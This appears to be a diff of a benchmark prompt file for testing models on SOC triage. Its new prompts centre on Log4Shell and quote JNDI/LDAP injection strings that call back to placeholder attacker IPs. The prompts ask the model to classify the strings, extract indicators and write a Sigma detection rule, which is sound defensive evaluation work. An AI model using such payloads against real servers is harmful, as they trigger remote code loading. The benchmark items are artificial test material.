@@ -1,9 +1,13 @@
 # Security benchmark prompts for local model evaluation
 # Format: one prompt per block, separated by ---
-# These represent realistic SOC analyst queries — short enough to run in < 60 s on CPU.
+# These represent realistic SOC analyst triage queries — short enough to run in < 60 s on CPU.
+#
+# Anchor: the Log4Shell exploitation wave (CVE-2021-44228, Apache Log4j2 JNDI RCE, Dec 2021).
+# Artifacts are public-shaped: JNDI/LDAP callback strings and the real CVE id. Any IPs/hosts
+# are RFC 5737 / RFC 2606 documentation placeholders, NOT real or invented corporate names.
 
 PROMPT_1
-You are a security analyst. A Windows endpoint generated this alert: "Process cmd.exe spawned by winword.exe with argument: /c powershell -EncodedCommand ZQBjAGgAbwAgAGgAZQBsAGwAbwA=". In one sentence, identify the ATT&CK technique and recommended immediate action.
+You are a SOC analyst triaging a Log4Shell (CVE-2021-44228) detection. A web server access log contains this User-Agent value: "${jndi:ldap://198.51.100.23:1389/Exploit}". In one sentence, classify whether this indicates Log4Shell exploitation activity and state the recommended immediate action.
 
 ---
 
@@ -13,7 +17,7 @@ You are a threat intelligence analyst. Summarise CVE-2021-44228 (Log4Shell) in t
 ---
 
 PROMPT_3
-You are a SOC analyst. An endpoint security tool generated this alert: "Unusual outbound connection from host MERIDIAN-FIN-07 to 185.220.101.42:443 at 02:14 UTC. Process: svchost.exe. Duration: 47 minutes." List three hypotheses (ranked by likelihood) and the first log source you would pivot to for each.
+You are a SOC analyst. Extract the indicator of compromise from this exploit string captured in a log: 'GET / HTTP/1.1 Host: 192.0.2.10 X-Api-Version: ${jndi:ldap://192.0.2.200:1389/a}'. Return only the attacker-controlled callback URL and the destination IP and port it would reach out to.
 
 ---
 
@@ -23,4 +27,4 @@ You are a malware analyst. A file has SHA-256 hash e3b0c44298fc1c149afbf4c8996fb
 ---
 
 PROMPT_5
-You are a security engineer. Write a single Sigma rule (YAML) that detects PowerShell launching with the -EncodedCommand flag on a Windows host. Include the logsource, detection, and condition fields. Tag it with the correct MITRE ATT&CK technique ID.
+You are a security engineer. Write a single Sigma rule (YAML) that detects the Log4Shell JNDI lookup pattern (a "${jndi:" string in an HTTP request header or URI) on a web server. Include the logsource, detection, and condition fields. Tag it with the correct MITRE ATT&CK technique ID.
